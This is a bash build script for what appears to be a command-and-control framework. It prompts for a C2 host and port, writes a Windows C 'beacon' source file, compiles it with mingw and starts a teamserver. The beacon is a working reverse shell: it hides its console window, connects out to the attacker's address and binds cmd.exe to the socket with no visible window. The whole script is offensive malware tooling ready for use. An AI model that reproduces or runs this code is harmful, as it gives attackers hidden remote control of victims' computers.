#!/bin/bash

read -p "Enter the C2 host: " Host
read -p "Enter the C2 port: " Port


# Define the filename
FILENAME="src/teamserver/beacon_source/beacon.c"

# Write the C code into the file with dynamic IP and port
cat <<EOF > $FILENAME
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")

#define ATTACKER_IP "$Host"
#define ATTACKER_PORT $Port

void hide_console() {
    HWND stealth;
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    if (stealth) {
        ShowWindow(stealth, SW_HIDE);
    }
}

int main() {
    hide_console(); // Hide the window at start

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        WSACleanup();
        return 1;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    si.wShowWindow = SW_HIDE;  // Ensure it runs hidden

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    return 0;
}
EOF

read -p "Enter the path and name for beacon: " beacon
x86_64-w64-mingw32-gcc src/teamserver/beacon_source/beacon.c -o $beacon -lws2_32 -mwindows
bash -c "./src/teamserver/exec/teamserver_2 $Host $Port"
